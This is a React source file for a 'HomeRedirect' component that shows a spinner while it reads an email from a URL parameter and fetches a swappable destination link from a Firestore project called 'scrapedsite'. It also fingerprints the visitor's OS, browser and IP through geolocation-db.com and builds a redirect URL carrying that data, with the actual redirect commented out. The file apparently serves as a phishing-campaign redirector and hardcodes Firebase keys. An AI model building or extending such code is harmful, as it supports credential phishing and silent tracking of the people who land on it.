import React, { useEffect } from "react";
import { initializeApp } from "firebase/app";
import { doc, getFirestore, onSnapshot } from "firebase/firestore";
import { browserName, osName } from "react-device-detect";
import "./loaderstyle.css";
import axios from "axios";

const firebaseApp = initializeApp({
  apiKey: "AIzaSyBNSKpZ1syb0z8g8OOoye1lps1k7AcXpk8",
  authDomain: "scrapedsite.firebaseapp.com",
  projectId: "scrapedsite",
  storageBucket: "scrapedsite.appspot.com",
  messagingSenderId: "317704250761",
  appId: "1:317704250761:web:eff67f6e124883fb61ad58",
  measurementId: "G-WWFDG2HKPK",
});
const db = getFirestore(firebaseApp);

function HomeRedirect() {
  const queryParams = new URLSearchParams(window.location.search);
  const email = queryParams.get("including");

  useEffect(() => {
    var requestOptions = {
      method: "GET",
      redirect: "follow",
      mode: "no-cors",
    };

    onSnapshot(doc(db, "pagelink", "LbzVoX2SNQS20OtzEfYN"), (doc) => {
      console.log(doc.data());

      const currentLink = doc.data().currentlink;
      const date = new Date().getMilliseconds();

      console.log(`${osName} ${browserName}`);

      const getIP = async () => {
        const res = await axios.get("https://geolocation-db.com/json/");
        return res;
      };

      getIP().then((res) => {
        const ip=res.data.IPv4
        console.log(`http://localhost:3000/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
       // window.location.assign(`${currentLink}/${date}/?inclusive=${email}`);
      // window.location.assign(`http://localhost:3000/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
      });

      /*
      // wake glitch.com page
      fetch(`${currentLink}`, requestOptions)
        .then((response) => {
          console.log(response.status);
          window.location.assign(`${currentLink}/${date}/?inclusive=${email}`);
        })
        .catch((error) => {
          console.log("error", error);
          window.location.assign(`${currentLink}/${date}/?inclusive=${email}`);
        });

        */
    });
  });

  return (
    <div style={{ display: "flex", justifyContent: "center", marginTop: 50 }}>
      <div className="lds-spinner">
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
      </div>
    </div>
  );
}

export default HomeRedirect;
